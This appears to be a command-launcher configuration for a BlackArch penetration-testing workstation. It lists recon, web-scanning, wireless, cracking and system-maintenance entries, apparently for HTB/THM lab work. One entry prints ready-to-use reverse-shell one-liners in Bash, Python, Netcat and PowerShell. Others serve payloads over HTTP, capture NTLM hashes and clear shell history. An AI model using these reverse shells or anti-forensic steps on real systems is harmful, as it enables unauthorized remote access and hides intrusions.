name: Nmap Fast Top-1000 Service Scan
description: Scans top 1000 TCP ports with default NSE scripts (-sC) and version detection (-sV), saving output.

name: Nmap Full All-Ports TCP Scan
description: High-speed full 65,535 TCP port SYN scan with service and script enumeration.

name: Nmap NSE Vulnerability Scan
description: Runs Nmap's built-in 'vuln' category NSE scripts against open services on the target.

name: RustScan Ultra-Fast Port Discovery
description: Scans all 65k ports in seconds using RustScan and pipes discovered ports directly into Nmap.

name: Subfinder Passive Subdomain Enum
description: Passively discovers valid subdomains for a target domain using OSINT sources.

name: Amass Passive Attack Surface Mapping
description: In-depth DNS and subdomain mapping using OWASP Amass in passive mode.

name: theHarvester Email & Subdomain OSINT
description: Gathers emails, names, subdomains, IPs, and URLs from public OSINT sources.

name: DNS & WHOIS Full Intelligence Check
cmd: echo '=== DNS RECORDS ===' && dig {target} ANY +noall +answer && echo '=== WHOIS ===' && whois {target} | head -n 45
description: Queries DNS records and WHOIS registration details for the target domain or IP.

name: Sherlock Username OSINT Hunt
description: Hunts down social media accounts by username across 400+ social networks (put username in TARGET).

name: WhatWeb Technology Fingerprinter
description: Identifies CMS, web frameworks, server headers, JavaScript libraries, and versions.

name: FFUF Fast Directory & File Fuzzing
description: Fuzzes hidden web directories and endpoints at high speed using FFUF.

name: FFUF Virtual Host (VHost) Discovery
description: Discovers internal virtual hosts by fuzzing the HTTP Host header.

name: Gobuster Directory & Extension Bruteforce
description: Bruteforces directories and common backup/script file extensions on a web server.

name: Nuclei Automated Vulnerability Scanner
description: Runs fast template-based CVE, misconfiguration, and exposure checks with ProjectDiscovery Nuclei.

name: Nikto Web Server Misconfiguration Scan
description: Scans web servers for dangerous files, outdated server software, and missing security headers.

name: SQLMap Automated SQL Injection Wizard
description: Tests URL parameters for SQL injection vulnerabilities and enumerates database names.

name: WPScan WordPress Vulnerability Audit
description: Enumerates vulnerable plugins, themes, and users on a target WordPress site.

name: HTTP Response & Security Headers Inspector
description: Fetches and displays raw HTTP response headers (Server, CSP, HSTS, Cookies) from the target.

name: Local LAN Host Discovery (ARP Scan)
description: Discovers all active devices, IPs, and MAC vendor names on your local network segment.

name: Enable Wi-Fi Monitor Mode (airmon-ng)
cmd: sudo airmon-ng check kill && sudo airmon-ng start {interface}
description: Stops conflicting network managers and puts your wireless interface into monitor mode.

name: Airodump-ng Wireless Packet Sniffer
description: Captures raw 802.11 frames to view nearby Access Points, channels, clients, and WPA handshakes.

name: Wifite2 Automated Wireless Auditor
description: Automated wireless auditing tool for WPA/WPA2 handshakes, PMKID, and WPS attacks.

name: Bettercap Swiss-Army Network Framework
description: Launches interactive Bettercap session for network reconnaissance, ARP spoofing, and BLE/Wi-Fi auditing.

name: Responder LLMNR / NBT-NS / mDNS Poisoner
description: Captures NTLMv1/v2 hashes on internal networks by answering LLMNR, NBT-NS, and mDNS queries.

name: TCPDump Live Packet Capture on Target
description: Captures live network packets to/from {target} on the active network interface.

name: Inspect Active Local Listening Ports & Sockets
description: Displays all open TCP and UDP listening ports and owning processes on your machine.

name: SearchSploit Exploit-DB Offline Search
description: Searches the local Exploit-DB archive for public exploits matching {target} software/CVE.

name: Metasploit Framework Console (msfconsole)
description: Launches the Metasploit Framework interactive console in quiet banner mode.

name: Netcat Reverse Shell Listener (rlwrap)
description: Starts a readline-wrapped Netcat listener on port {lport} with arrow-key history support.

name: Generate One-Liner Reverse Shell Cheatsheet
cmd:
printf '=== BASH ===
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1

=== PYTHON3 ===
python3 -c "import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")"

=== NC MKFIFO ===
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f

=== POWERSHELL ===
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\x27{lhost}\x27,{lport});$s = $client.GetStream();[byte[]]$b = 0..65535|%%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \x27PS \x27 + (pwd).Path + \x27> \x27;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
'
description: Generates ready-to-copy Bash, Python3, Netcat mkfifo, and PowerShell reverse shells pre-filled with your {lhost} and {lport}.

name: Python Quick HTTP Payload/File Server
cmd: echo "Serving current directory on http://{lhost}:8000" && python3 -m http.server 8000
description: Starts a quick HTTP file server on port 8000 for transferring enumeration scripts or payloads to targets.

name: NetExec (CrackMapExec) SMB Share & Signing Enum
description: Enumerates SMB host details, signing status, and accessible shares using NetExec.

name: Hydra SSH Password Audit
description: Tests SSH credentials against {target} using the configured wordlist.

name: Hashcat GPU/CPU Cracking Benchmark
description: Benchmarks your PC's GPU/CPU cracking speed for MD5 (0), NTLM (1000), and WPA-PBKDF2 (22000).

name: John the Ripper Wordlist Crack
description: Runs John the Ripper against hashes.txt using your configured wordlist.

name: Launch Ghidra SRE Suite
description: Launches the NSA Ghidra Software Reverse Engineering graphical suite.

name: Radare2 Binary Analysis Disassembler
description: Opens a binary file specified in {target} and performs full analysis with Radare2.

name: Binwalk Firmware Extraction & Analysis
description: Scans and recursively extracts embedded file systems and compressed archives from firmware images.

name: ExifTool Metadata Inspector
description: Extracts EXIF, GPS, author, and software metadata from images, PDFs, or office documents.

name: OPSEC Public IP, ASN & Geo Verification
description: Verifies your external public IP address, ISP/ASN, location, and active local network interfaces.

name: Connect OpenVPN Tunnel (HTB / THM / VPN)
description: Connects to an OpenVPN profile (.ovpn path in TARGET) to establish your tun0 tunnel.

name: Spoof Random MAC Address on Interface
cmd: sudo ip link set {interface} down && sudo macchanger -r {interface} && sudo ip link set {interface} up
description: Brings {interface} down, assigns a randomized hardware MAC address, and brings it back up.

name: Start Tor Anonymity Service & Check Port 9050
cmd: sudo systemctl start tor && ss -tlpn | grep 9050
description: Starts the Tor SOCKS5 proxy service (127.0.0.1:9050) for use with proxychains-ng.

name: Clear Shell History & DNS Cache
cmd: history -c && rm -f ~/.bash_history ~/.zsh_history && sudo systemd-resolve --flush-caches 2>/dev/null || true && echo 'Shell history and DNS caches cleared.'
description: Clears local bash/zsh command histories and flushes local DNS resolver caches.

name: Inspect All Disks & Dual-Boot Partitions (lsblk)
description: Lists all physical drives and partitions (including Windows NTFS/BitLocker/EFI and Linux partitions).

name: Auto-Detect & Mount Windows NTFS Partition
cmd: WIN_PART=$(lsblk -rn -o PATH,FSTYPE | awk '$2=="ntfs"{print $1; exit}'); if [ -n "$WIN_PART" ]; then sudo mkdir -p /mnt/windows && sudo mount -t ntfs3 "$WIN_PART" /mnt/windows && echo "Mounted $WIN_PART at /mnt/windows" && ls -la /mnt/windows; else echo 'No unmounted NTFS partition detected.'; fi
description: Finds the first Windows NTFS partition on your dual-boot PC and mounts it at /mnt/windows for easy file sharing.

name: Fix Dual-Boot Windows/Linux Clock Skew (Local RTC)
description: Configures Linux to store hardware RTC time in Local Time so Windows and BlackArch stop shifting your PC clock.

name: Update GRUB Bootloader with Dual-Boot OS Prober
cmd: sudo pacman -S --needed --noconfirm os-prober ntfs-3g && sudo sed -i 's/^#*GRUB_DISABLE_OS_PROBER=.*/GRUB_DISABLE_OS_PROBER=false/' /etc/default/grub && sudo grub-mkconfig -o /boot/grub/grub.cfg
description: Enables os-prober and regenerates /boot/grub/grub.cfg so Windows Boot Manager is listed in your boot menu.

name: Full BlackArch & Arch System Update (pacman -Syu)
description: Synchronizes repositories and upgrades all installed Arch and BlackArch packages.

name: Bootstrap / Repair BlackArch Repository (strap.sh)
cmd: curl -O https://blackarch.org/strap.sh && chmod +x strap.sh && sudo ./strap.sh && rm -f strap.sh
description: Downloads and runs the official BlackArch strap.sh script to add the BlackArch repository and GPG keyring.

name: List All BlackArch Tool Categories
description: Lists every BlackArch tool group (e.g., blackarch-webapp, blackarch-recon, blackarch-wireless, blackarch-cracker).

name: Read Hardware Temperatures, Fans & Voltages
description: Displays live CPU, GPU, NVMe, and motherboard temperature sensors and fan RPMs.

name: Detailed GPU & PCI Hardware Inspection
description: Shows installed GPU hardware, active kernel drivers (nvidia/amdgpu/i915), and VRAM status.

name: Launch Btop++ Resource Monitor
description: Opens the full-screen Btop++ system resource monitor.

name: System Summary & Hardware Fetch (Fastfetch)
description: Displays BlackArch ASCII art alongside OS, kernel, CPU, GPU, RAM, and WM details.

name: Clean Pacman Package Cache & Orphan Packages
cmd: sudo pacman -Sc --noconfirm && (sudo pacman -Rns $(pacman -Qdtq) 2>/dev/null || echo 'No orphan packages found.')
description: Frees up disk space on your dual-boot partition by clearing old package caches and unused orphan dependencies.
